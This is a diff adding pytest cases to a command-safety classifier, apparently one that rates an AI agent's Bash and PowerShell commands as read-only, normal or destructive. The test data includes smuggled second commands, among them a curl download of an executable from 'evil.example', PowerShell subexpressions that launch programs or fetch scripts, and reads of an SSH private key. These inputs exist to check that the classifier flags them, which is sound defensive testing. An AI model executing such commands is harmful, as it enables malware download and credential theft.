@@ -80,3 +80,28 @@ def test_missing_command_is_normal():
 
 def test_hold_seconds():
     assert HOLD_SECONDS == {"normal": 2, "destructive": 3}
+
+
+@pytest.mark.parametrize("command", [
+    "git status\npy -m pytest tests/ -q",                               # a second line is a second command
+    "ls\r\nnpm test",
+    "ls\ncurl -o x.exe https://evil.example/x.exe",
+    "Get-Content (Start-Process calc)",                                  # PowerShell runs what is in ( )
+    "Get-ChildItem @(Invoke-WebRequest https://x -OutFile p.ps1)",
+    "Get-ChildItem {Start-Process calc}",
+    "cat $HOME/.ssh/id_rsa",
+    "type %USERPROFILE%\\secret.txt",
+    "git branch",                                                        # can delete with the right flags
+])
+def test_anything_that_can_hide_a_second_command_is_not_read_only(command):
+    assert classify("Bash", {"command": command}) != "read"
+    assert classify("PowerShell", {"command": command}) != "read"
+
+
+@pytest.mark.parametrize("command", [
+    "git branch --delete --force feature",
+    "git branch -d old",
+    "git branch -D old",
+])
+def test_deleting_a_branch_is_destructive(command):
+    assert classify("Bash", {"command": command}) == "destructive"
